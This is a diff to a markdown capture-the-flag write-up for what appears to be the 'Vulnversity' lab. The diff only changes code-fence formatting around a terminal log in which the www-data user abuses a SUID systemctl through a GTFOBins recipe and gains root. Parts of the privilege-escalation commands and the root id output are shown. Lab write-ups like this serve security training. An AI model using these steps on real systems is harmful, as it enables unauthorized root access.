@@ -124,7 +124,7 @@ We can see that /bin/systemctl stands out from the rest;
 
 With help of Gtfobins, we can execute commands as root & we are ROOT!
 
-```www-data@vulnuniversity:/opt$ priv=$(mktemp).service
+`````www-data@vulnuniversity:/opt$ priv=$(mktemp).service
 priv=$(mktemp).service
 www-data@vulnuniversity:/opt$ echo '[Service]
 echo '[Service]
@@ -151,8 +151,7 @@ ls
 flag  flags
 www-data@vulnuniversity:/opt$ cat flags
 cat flags
-uid=0(root) gid=0(root) groups=0(root)
-```
+uid=0(root) gid=0(root) groups=0(root)`````
 
 ###References-
 
